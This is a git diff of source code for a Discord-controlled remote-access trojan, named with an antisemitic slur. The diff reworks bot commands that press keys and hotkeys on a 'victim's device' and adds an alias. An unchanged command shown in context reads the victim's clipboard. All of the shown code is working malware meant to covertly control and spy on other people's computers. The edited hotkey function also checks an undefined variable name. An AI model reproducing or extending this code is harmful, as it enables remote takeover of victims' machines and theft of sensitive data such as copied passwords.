@@ -47,7 +47,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.4" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.6.5" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -1746,49 +1746,41 @@ async def rclick(ctx):
     except Exception as e:
         await ctx.send(f"Error executing right click: {str(e)}")
 
-@bot.command(help="Triggers a pyautogui hotkey on victims device seperated by spaces. Available keys: https://bit.ly/3ya6vKg.", usage="$hotkey <keys (button+button)>")
-async def hotkey(ctx, *, keys=None):
-    if not keys:
-        await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
-        return
-
+@bot.command(help="Press a hotkey on victim's device. Available keys: https://bit.ly/3ya6vKg.", usage="$hotkey <keys ('btn+btn'/'btn btn')>")
+async def hotkey(ctx, *, keys: str = ""):
     try:
-        pyautogui.hotkey(*keys.split())
-        await ctx.send(f"Pressed hotkey: `{keys}`")
+        if not key or key == "":
+            await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
+            return
+
+        k = keys.replace("+", " ").split()
+        pyautogui.hotkey(*k)
+        await ctx.send(f"Pressed hotkey: `{'+'.join(k)}`")
     except Exception as e:
         await ctx.send(f"Error: `{e}`")
 
-@bot.command(help="Press a key/hotkey on victim's device. Available keys: https://bit.ly/3ya6vKg", usage="$key <up|down|press|hotkey (button+button)> <key(s)>")
-async def key(ctx, func: str = "", value: str = ""):
-    if not func:
-        await ctx.send("Function not provided. Available functions: press, down, up, hotkey.")
-        return
-
-    func = func.lower()
-    
-    if func not in ["press", "down", "up", "hotkey"]:
-        await ctx.send("Invalid function. Available functions: press, down, up, hotkey.")
-        return
-
-    if not value or value == "":
-        await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
-        return
-    
+@bot.command(aliases=["press"], help="Press a key/hotkey on victim's device. Available keys: https://bit.ly/3ya6vKg", usage="$key <key(s)>")
+async def key(ctx, *, key: str = ""):
     try:
-        if func == "press":
-            pyautogui.press(value)
-        elif func == "down":
-            pyautogui.keyDown(value)
-        elif func == "up":
-            pyautogui.keyUp(value)
-        elif func == "hotkey":
-            keys = value.split("+")
-            pyautogui.hotkey(*keys)
+        if not key or key == "":
+            await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
+            return
         
-        await ctx.send("Command executed successfully.")
+        keys = key.replace("+", " ").split()
+        if len(keys) == 1:
+            pyautogui.press(key)
+            await ctx.send(f"Pressed key: `{key}`")
+        
+        elif len(keys) < 1:
+            await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
+            return
+        
+        else:
+            pyautogui.hotkey(*keys)
+            await ctx.send(f"Pressed hotkey: `{'+'.join(keys)}`")
+        
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
-
 
 @bot.command(aliases=["get_clipboard"], help="Get victims clipboard.", usage="$get_clipboard")
 async def getclipboard(ctx):
